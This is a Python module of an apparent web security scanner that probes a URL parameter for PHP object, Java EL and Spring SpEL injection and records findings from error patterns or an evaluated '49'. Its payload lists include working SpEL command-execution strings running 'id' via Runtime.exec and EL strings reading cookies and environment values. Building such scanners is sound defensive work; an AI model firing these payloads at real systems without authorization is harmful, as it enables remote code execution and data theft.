import logging
import httpx
import asyncio
import re
import time
import json
import uuid
from typing import Optional
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from backend.api.websocket import emit_finding, emit_tool_output

logger = logging.getLogger(__name__)

PHP_OBJECT_PATTERNS = [
    r"unserialize",
    r"__wakeup",
    r"__destruct",
    r"__toString",
    r"__call",
    r"__get",
    r"__set",
    r"Serializable",
    r"O:\d+:",
    r"a:\d+:\{",
    r"unserialize\(\s*\$",
    r"Serialization of .*? is not allowed",
    r"allowed classes",
    r"__PHP_Incomplete_Class",
]

EL_INJECTION_PATTERNS = [
    r"\$\{.*?\}",
    r"\#\{.*?\}",
    r"ELException",
    r"el\.EvaluationException",
    r"javax\.el",
    r"ExpressionFactory",
    r"ELContext",
    r"ValueExpression",
    r"MethodExpression",
    r"\$\{request\.getParameter",
    r"\$\{param\.",
    r"\$\{header\.",
    r"\$\{cookie\.",
    r"\$\{env\.",
]

SPEL_PATTERNS = [
    r"SpelEvaluationException",
    r"spel\.SpelEvaluationException",
    r"org\.springframework\.expression",
    r"ExpressionParser",
    r"StandardEvaluationContext",
    r"SpelExpressionParser",
    r"\$\{.*?T\(java\.lang\.\w+\)",
    r"\$\{.*?Runtime\.getRuntime",
    r"\$\{.*?ProcessBuilder",
    r"\$\{.*?\.exec\(",
    r"\$\{.*?class\.forName",
    r"\$\{.*?getClass",
]

SPEL_EXPRESSIONS = [
    "${7*7}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}",
    "#{7*7}",
    "#{T(java.lang.Math).random()*10000}",
]

EL_EXPRESSIONS = [
    "${7*7}",
    "#{7*7}",
    "${request.getParameter('test')}",
    "${param.test}",
    "${header['user-agent']}",
    "${cookie.JSESSIONID.value}",
    "${env.PATH}",
]


class ObjectInjectionScanner:
    def __init__(self, timeout: int = 30, verify_ssl: bool = False):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self._findings = []

    async def scan(self, element: dict, payloads: list[dict]) -> list[dict]:
        findings = []
        url = element.get("url", "")
        param_name = element.get("parameter_name", "")
        method = element.get("http_method", "GET").upper()
        scan_id = element.get("scan_id", "")

        if not url or not param_name:
            return findings

        try:
            baseline = await self._get_baseline(url, method, param_name)
        except Exception as e:
            logger.error(f"Object injection baseline failed for {url}: {e}")
            return findings

        for payload in payloads:
            subtype = payload.get("subtype", "php_object")
            payload_str = payload.get("payload_string", "")

            if subtype == "php_object":
                result = await self._test_php_object(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "el_injection":
                result = await self._test_el_injection(
                    url, method, param_name, payload_str, baseline
                )
            elif subtype == "spel_injection":
                result = await self._test_spel_injection(
                    url, method, param_name, payload_str, baseline
                )
            else:
                result = await self._test_php_object(
                    url, method, param_name, payload_str, baseline
                )

            if result:
                findings.append(result)

        self._findings = findings
        return findings

    async def _get_baseline(self, url: str, method: str, param_name: str) -> dict:
        start = time.time()
        async with httpx.AsyncClient(
            verify=self.verify_ssl, timeout=self.timeout, follow_redirects=True
        ) as client:
            if method == "GET":
                resp = await client.get(url)
            else:
                resp = await client.post(url, data={param_name: "baseline"})
            elapsed = time.time() - start
            return {
                "status_code": resp.status_code,
                "body": resp.text,
                "body_length": len(resp.text),
                "response_time": elapsed,
                "headers": dict(resp.headers),
            }

    async def _send_payload(
        self, url: str, method: str, param_name: str, payload: str
    ) -> dict:
        start = time.time()
        try:
            async with httpx.AsyncClient(
                verify=self.verify_ssl, timeout=self.timeout, follow_redirects=True
            ) as client:
                if method == "GET":
                    parsed = urlparse(url)
                    params = parse_qs(parsed.query)
                    params[param_name] = [payload]
                    new_query = urlencode(params, doseq=True)
                    inject_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment,
                    ))
                    resp = await client.get(inject_url)
                else:
                    resp = await client.post(url, data={param_name: payload})
                elapsed = time.time() - start
                return {
                    "status_code": resp.status_code,
                    "body": resp.text,
                    "body_length": len(resp.text),
                    "response_time": elapsed,
                    "headers": dict(resp.headers),
                    "error": None,
                }
        except httpx.TimeoutException:
            return {"status_code": 0, "body": "", "body_length": 0, "response_time": time.time() - start, "headers": {}, "error": "timeout"}
        except Exception as e:
            return {"status_code": 0, "body": "", "body_length": 0, "response_time": time.time() - start, "headers": {}, "error": str(e)}

    def _create_finding(
        self, title: str, description: str, severity: str, cvss: float,
        confidence: str, family: str, subtype: str, payload: str,
        request_data: dict, response_data: dict, evidence: dict
    ) -> dict:
        return {
            "id": str(uuid.uuid4()),
            "title": title,
            "description": description,
            "severity": severity,
            "cvss_score": cvss,
            "confidence": confidence,
            "injection_family": family,
            "injection_subtype": subtype,
            "payload": payload,
            "request_data": request_data,
            "response_data": response_data,
            "evidence_json": json.dumps(evidence),
        }

    def _match_patterns(self, body: str, patterns: list[str]) -> list[str]:
        matches = []
        body_lower = body.lower()
        for pattern in patterns:
            if re.search(pattern, body_lower, re.IGNORECASE):
                matches.append(pattern)
        return matches

    def _check_expression_evaluation(self, body: str, expression: str, expected: str) -> bool:
        return expected in body

    async def _test_php_object(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        matches = self._match_patterns(body, PHP_OBJECT_PATTERNS)

        if matches:
            return self._create_finding(
                title="Object Injection - PHP Object Injection",
                description=f"PHP object injection detected. Deserialization error patterns found: {', '.join(matches[:3])}",
                severity="critical",
                cvss=9.8,
                confidence="high",
                family="object_injection",
                subtype="php_object",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"], "body_length": resp["body_length"]},
                evidence={"matched_patterns": matches[:5]},
            )

        if "O:" in payload and resp["status_code"] != baseline["status_code"]:
            return self._create_finding(
                title="Object Injection - PHP Object Injection (Status Change)",
                description="PHP serialized object payload caused status code anomaly.",
                severity="high",
                cvss=8.6,
                confidence="medium",
                family="object_injection",
                subtype="php_object",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"]},
                evidence={"status_change": True},
            )
        return None

    async def _test_el_injection(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        matches = self._match_patterns(body, EL_INJECTION_PATTERNS)

        if matches:
            return self._create_finding(
                title="Object Injection - EL Injection",
                description=f"Expression Language injection detected. Patterns: {', '.join(matches[:3])}",
                severity="critical",
                cvss=9.8,
                confidence="high",
                family="object_injection",
                subtype="el_injection",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"], "body_length": resp["body_length"]},
                evidence={"matched_patterns": matches[:5]},
            )

        for expression in EL_EXPRESSIONS:
            resp2 = await self._send_payload(url, method, param_name, expression)
            if not resp2.get("error") and "49" in resp2["body"]:
                return self._create_finding(
                    title="Object Injection - EL Injection (Expression Eval)",
                    description=f"EL expression evaluated: {expression} -> 49",
                    severity="critical",
                    cvss=10.0,
                    confidence="high",
                    family="object_injection",
                    subtype="el_injection",
                    payload=expression,
                    request_data={"url": url, "method": method, "param": param_name, "payload": expression},
                    response_data={"status_code": resp2["status_code"]},
                    evidence={"expression": expression, "evaluated": True},
                )
        return None

    async def _test_spel_injection(
        self, url: str, method: str, param_name: str, payload: str, baseline: dict
    ) -> Optional[dict]:
        resp = await self._send_payload(url, method, param_name, payload)
        if resp.get("error"):
            return None

        body = resp["body"]
        matches = self._match_patterns(body, SPEL_PATTERNS)

        if matches:
            return self._create_finding(
                title="Object Injection - SpEL Injection",
                description=f"Spring Expression Language injection detected. Patterns: {', '.join(matches[:3])}",
                severity="critical",
                cvss=9.8,
                confidence="high",
                family="object_injection",
                subtype="spel_injection",
                payload=payload,
                request_data={"url": url, "method": method, "param": param_name, "payload": payload},
                response_data={"status_code": resp["status_code"], "body_length": resp["body_length"]},
                evidence={"matched_patterns": matches[:5]},
            )

        for expression in SPEL_EXPRESSIONS:
            resp2 = await self._send_payload(url, method, param_name, expression)
            if not resp2.get("error") and "49" in resp2["body"]:
                return self._create_finding(
                    title="Object Injection - SpEL Injection (Expression Eval)",
                    description=f"SpEL expression evaluated: {expression} -> 49",
                    severity="critical",
                    cvss=10.0,
                    confidence="high",
                    family="object_injection",
                    subtype="spel_injection",
                    payload=expression,
                    request_data={"url": url, "method": method, "param": param_name, "payload": expression},
                    response_data={"status_code": resp2["status_code"]},
                    evidence={"expression": expression, "evaluated": True},
                )
        return None
